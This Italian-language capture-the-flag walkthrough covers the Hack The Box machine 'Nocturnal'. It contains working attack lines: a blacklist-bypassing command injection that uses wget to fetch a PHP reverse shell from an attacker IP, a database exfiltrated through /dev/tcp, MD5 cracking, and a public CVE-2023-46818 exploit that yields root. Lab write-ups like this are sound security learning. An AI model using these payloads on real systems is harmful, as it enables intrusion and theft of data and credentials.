```txt                                                      
o    o                 o                            8 
8b   8                 8                            8 
8`b  8 .oPYo. .oPYo.  o8P o    o oPYo. odYo. .oPYo. 8 
8 `b 8 8    8 8    '   8  8    8 8  `' 8' `8 .oooo8 8 
8  `b8 8    8 8    .   8  8    8 8     8   8 8    8 8 
8   `8 `YooP' `YooP'   8  `YooP' 8     8   8 `YooP8 8 
..:::..:.....::.....:::..::.....:..::::..::..:.....:..
::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::

------------------------------------------------------------------------------

[ 0x01 ] Abstract
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTB NOCTURNAL - Walkthrough tecnico by NoFlyFre
Target: nocturnal.htb

------------------------------------------------------------------------------

[ 0x02 ] Enumeration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sS -sV -sC nocturnal.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    nginx 1.18.0 (Ubuntu)

Aggiunto dominio a /etc/hosts:
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts

------------------------------------------------------------------------------

[ 0x03 ] Web Enumeration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Su http://nocturnal.htb: login e registrazione.
Registrato utente prova:prova.

Dashboard autenticata: upload file (pdf, doc, odt, ecc).
File accessibili con:
http://nocturnal.htb/view.php?username=prova&file=prova.pdf

Brute-force su username (wfuzz) → trovato amanda.
privacy.odt contiene: Temporary password: arHkG7HAI68X8s1J

Login come amanda → accesso Admin Panel.

------------------------------------------------------------------------------

[ 0x04 ] Source Code Review
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
admin.php consente backup con comando:
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

Sanitizzazione password debole (blacklist):
[';', '&', '|', '$', ' ', '`', '{', '}', '&&']

Bypass con caratteri encoded:
- %0A = newline
- %09 = tab (spazio)

------------------------------------------------------------------------------

[ 0x05 ] Code Execution
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Upload reverse shell PHP su macchina (hostata con python3 -m http.server 1337).

POST request:
password=%0A/usr/bin/wget%0910.10.15.3:1337/shell.php%0A&backup=

Esecuzione shell:
curl http://nocturnal.htb/shell.php
nc -nvlp 4444

------------------------------------------------------------------------------

[ 0x06 ] Looting the Box
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ricerca database:
find / -regex ".*\.db" 2>/dev/null

Trovato:
 /var/www/nocturnal_database/nocturnal_database.db

Dump via:
cat /var/www/nocturnal_database/nocturnal_database.db > /dev/tcp/10.10.15.3/1339

Cracca MD5 (hashcat):
echo "55c82b1ccd55ab219b3b109b07d5061d" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show

tobias:slowmotionapocalypse

------------------------------------------------------------------------------

[ 0x07 ] SSH Access
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh tobias@nocturnal.htb

Verifica servizi interni:
ss -lnt
Porta 8080 è in ascolto su localhost.

Port forwarding:
ssh -L 9090:localhost:8080 tobias@nocturnal.htb

Accesso a ISPConfig su http://localhost:9090

------------------------------------------------------------------------------

[ 0x08 ] CVE-2023-46818 - RCE via ISPConfig
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Usato PoC: https://karmainsecurity.com/pocs/CVE-2023-46818.php

php exploit.php http://localhost:8080/ admin slowmotionapocalypse

Prompt shell interattiva:
ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

------------------------------------------------------------------------------

[ 0x09 ] Root Flag
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cat /root/root.txt

→ Rooted!

------------------------------------------------------------------------------

[ 0x0A ] Summary
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Step         | Description
-------------|-------------------------------------------------
nmap         | Enumerated open ports (22, 80)
Upload       | Found file upload + filename enumeration
File Leak    | Discovered amanda user + credentials from .odt
Admin Panel  | Identified ZIP command injection
Command Exec | Uploaded PHP shell via encoded injection
DB Dump      | Dumped SQLite DB, cracked MD5 password
SSH Access   | Logged in as tobias
Port Fwd     | Accessed ISPConfig on port 8080
CVE Exploit  | Used CVE-2023-46818 for RCE as root
Root         | Captured /root/root.txt

------------------------------------------------------------------------------

[ 0x0B ] Tags / Keywords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
security, htb, walkthrough, pentest, NoFlyFre, hacking, writeup, nocturnal

[ 0x0C ] Lingua
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ITA (Italiano)

------------------------------------------------------------------------------

[ 0x0D ] Credits & Disclaimer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Autore: NoFlyFre
Tutti i contenuti sono a scopo educativo e di ethical hacking.
Usa queste informazioni in modo responsabile.

------------------------------------------------------------------------------

        .: Knowledge, Skillz, Root :.
          .: Stay curious! :.
```